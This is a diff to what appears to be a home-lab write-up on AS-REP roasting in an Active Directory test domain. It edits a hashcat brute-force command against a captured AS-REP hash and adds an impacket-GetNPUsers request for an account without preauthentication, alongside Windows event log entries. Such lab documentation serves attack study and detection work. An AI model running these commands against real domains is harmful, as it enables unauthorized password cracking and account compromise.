@@ -318,7 +318,7 @@ Message              : A Kerberos authentication ticket (TGT) was requested.
 brute force the password hash using hashcat mode 32200:
 ```KALI01
 ┌──(jerry㉿kali01)-[~]
-└─$ hashcat -m 32200 -a 3 asrep-test.asrep '?d?d?dAa!'
+└─$ hashcat -m 32200 -a 3 asrep-test.asrep '?d?d?d?dAa!'
 hashcat (v7.1.2) starting
 
 OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
@@ -433,7 +433,7 @@ Message              : A user account was changed.
 test kerberos preauthentication in `KALI01` again:
 ```KALI01
 ┌──(jerry㉿kali01)-[~]
-└─$ cat asrep-test-request.txt
+└─$ impacket-GetNPUsers "ad.pearsonspecterlitt.com/asrep-test" -dc-ip 192.168.190.10 -no-pass
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Getting TGT for asrep-test
